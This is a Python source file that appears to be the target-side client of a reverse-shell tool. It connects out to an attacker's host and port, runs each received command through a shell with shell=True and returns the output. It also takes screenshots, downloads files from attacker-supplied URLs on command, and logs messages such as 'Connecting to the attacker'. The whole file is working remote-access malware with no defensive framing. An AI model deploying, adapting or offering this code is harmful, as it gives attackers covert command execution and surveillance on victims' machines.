# ========================================================================
# $File: target.py $
# $Date: 2019-01-21 23:03:50 $
# $Revision: $
# $Creator: Jen-Chieh Shen $
# $Notice: See LICENSE.txt for modification and distribution information
#                   Copyright © 2019 by Shen, Jen-Chieh $
# ========================================================================

import socket
import sys
import os
import locale
from subprocess import *

import command
import constant
import downloader
import logger
import screenshot


DEFAULT_LOCALE = []


def __resolve_hp():
    """Reolve host and port."""

    # Resolve arguments.
    arg_len = len(sys.argv)

    if 2 <= arg_len:
        host = sys.argv[1]
    else:
        host = constant.HOST

    if 3 <= arg_len:
        port = int(sys.argv[2])
    else:
        port = constant.PORT

    return host, port


def main():
    """Program Entry point."""

    DEFAULT_LOCALE = locale.getdefaultlocale()[1]

    host, port = __resolve_hp()

    logger.info("Connecting to the Reverse Shell server...")
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        logger.info(f"Connecting to the attacker : {host}:{port}")
        s.connect((host, port))

        while True:
            # Send the path.
            path = os.path.dirname(os.path.abspath(__file__))
            s.sendall(path.encode(constant.ENCODE_TYPE))

            # Receive it.
            data = s.recv(constant.BUF_SIZE)
            if not data:
                break

            full_cmd = data.decode(constant.DECODE_TYPE)
            data_str = str(data)
            logger.info(f"Received: {data_str}");


            cmd, params = command.get_cmd_params(full_cmd)
            params_len = len(params)

            # Check if is internal command type.
            iicp = command.is_internal_command_prefix(cmd)
            iic = False
            if iicp:
                # Remove prefix, get the internal command.
                rl_cmd = cmd[1:]
                iic = command.is_internal_command(rl_cmd)
                if not iic:
                    logger.error(f"'{full_cmd}' is not recognized internal command.")


            output = "** Default output command... **".encode(constant.ENCODE_TYPE)

            # Check internal command.
            if iic:
                # NOTE(jenchieh): Check possible command at this moment.
                if rl_cmd == command.Command.SHUTDOWN.value:
                    logger.info("Shutdown by attacker...")
                    break
                if rl_cmd == command.Command.SCREENSHOT.value:
                    logger.info("Taking screenshot...")
                    output = screenshot.pyscreenshot_screenshot()
                if rl_cmd == command.Command.DOWNLOAD.value:
                    if params_len >= 1:
                        url = params[0]
                        downloader.download(url)
                        output = "Done downloading the file!".encode(constant.ENCODE_TYPE)
            # Check regular shell command.
            else:
                if "cd" in full_cmd:
                    cd_path = params[0]
                    if ".." in cd_path:
                        os.chdir("..")
                    elif os.path.isdir(cd_path):
                        os.chdir(cd_path)
                    continue

                # Execute shell command.
                proc = Popen(full_cmd, stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
                outs, errs = proc.communicate()

                if outs:
                    output = outs
                if errs:
                    output = errs

            # Send results
            s.sendall(output)

        s.shutdown(socket.SHUT_RDWR)
        s.close()

        logger.info("Target program exits.")

if __name__ == "__main__":
    main()
